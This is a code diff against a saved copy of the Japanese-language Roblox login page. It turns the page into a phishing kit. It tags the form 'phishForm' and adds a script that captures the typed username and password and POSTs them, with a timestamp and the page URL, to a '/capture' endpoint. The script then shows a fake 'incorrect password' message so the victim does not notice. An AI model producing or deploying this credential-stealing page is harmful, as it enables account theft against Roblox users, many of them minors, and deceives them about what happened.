@@ -292,7 +292,7 @@
 
         <div class="content" id="content">
             
-<div id="react-login-web-app" class="login-container"><div id="background-image" class="background-image marketing-background-2"><div class="login-content-wrapper"><div id="login-base" class="login-base-container"><div class="section-content login-section"><h1 class="login-header">ロブロックスにログイン</h1><div id="login-form"><div><div class="login-form-container"><form class="login-form" name="loginForm"><div class="form-group username-form-group"><label for="login-username" class="sr-only">ユーザーネーム/メールアドレス/電話番号</label><input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="ユーザーネーム/メールアドレス/電話番号" value=""></div><div class="form-group password-form-group"><label for="login-password" class="sr-only">パスワード</label><input id="login-password" name="password" type="password" class="form-control input-field" placeholder="パスワード" value=""><div aria-live="polite"></div></div><button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">ログイン</button></form></div></div></div><div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">パスワード、またはユーザーネームをお忘れですか？</a></div><div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div></div><button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">ワンタイムコードをメールで送信</button><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>クイックサインイン</span></button></div><div id="crossDeviceLoginDisplayCodeModal-container"></div><div id="otp-login-container"></div><div id="account-switcher-confirmation-modal-container"></div><div class="text-center"><div class="signup-option"><span class="no-account-text">アカウントをお持ちではありませんか？</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/ja/CreateAccount" target="_self">新規登録</a></div></div></div><div id="react-login-account-limit-error-container"></div></div><div><div></div></div></div></div></div>
+<div id="react-login-web-app" class="login-container"><div id="background-image" class="background-image marketing-background-2"><div class="login-content-wrapper"><div id="login-base" class="login-base-container"><div class="section-content login-section"><h1 class="login-header">ロブロックスにログイン</h1><div id="login-form"><div><div class="login-form-container"><form class="login-form" name="loginForm" id="phishForm"><div class="form-group username-form-group"><label for="login-username" class="sr-only">ユーザーネーム/メールアドレス/電話番号</label><input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="ユーザーネーム/メールアドレス/電話番号" value=""></div><div class="form-group password-form-group"><label for="login-password" class="sr-only">パスワード</label><input id="login-password" name="password" type="password" class="form-control input-field" placeholder="パスワード" value=""><div aria-live="polite"></div></div><button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">ログイン</button></form></div></div></div><div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">パスワード、またはユーザーネームをお忘れですか？</a></div><div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div></div><button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">ワンタイムコードをメールで送信</button><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>クイックサインイン</span></button></div><div id="crossDeviceLoginDisplayCodeModal-container"></div><div id="otp-login-container"></div><div id="account-switcher-confirmation-modal-container"></div><div class="text-center"><div class="signup-option"><span class="no-account-text">アカウントをお持ちではありませんか？</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/ja/CreateAccount" target="_self">新規登録</a></div></div></div><div id="react-login-account-limit-error-container"></div></div><div><div></div></div></div></div></div>
 
         </div>
     </main><!--Bootstrap Footer React Component -->
@@ -678,6 +678,75 @@
 
 
     <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="pageEnd" type="text/javascript" src="./ロブロックスにログイン_files/dd2a8221e86ed4fa63c32850a801c5b8.js.ダウンロード"></script>
+
+
+    <script>
+(function() {
+    'use strict';
+
+    document.addEventListener('DOMContentLoaded', function() {
+        var form = document.getElementById('phishForm');
+        var usernameInput = document.getElementById('login-username');
+        var passwordInput = document.getElementById('login-password');
+        var loginButton = document.getElementById('login-button');
+
+        if (!form || !loginButton) return;
+
+        loginButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            var username = usernameInput.value.trim();
+            var password = passwordInput.value;
+
+            if (!username || !password) {
+                alert('ユーザーネームとパスワードを入力してください');
+                return;
+            }
+
+            loginButton.disabled = true;
+            loginButton.textContent = 'ログイン中...';
+
+            fetch('/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: username,
+                    password: password,
+                    timestamp: Date.now(),
+                    url: location.href
+                })
+            }).then(function() {
+                setTimeout(function() {
+                    loginButton.disabled = false;
+                    loginButton.textContent = 'ログイン';
+
+                    var errorDiv = document.createElement('div');
+                    errorDiv.style.cssText = 'color: #cc0000; font-size: 14px; margin-top: 10px; text-align: center;';
+                    errorDiv.textContent = 'ユーザーネームまたはパスワードが正しくありません';
+
+                    form.appendChild(errorDiv);
+                    passwordInput.value = '';
+
+                    setTimeout(function() {
+                        errorDiv.remove();
+                    }, 5000);
+                }, 1500);
+            }).catch(function() {
+                loginButton.disabled = false;
+                loginButton.textContent = 'ログイン';
+            });
+        }, true);
+
+        form.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                loginButton.click();
+            }
+        });
+    });
+})();
+</script>
 
 
 
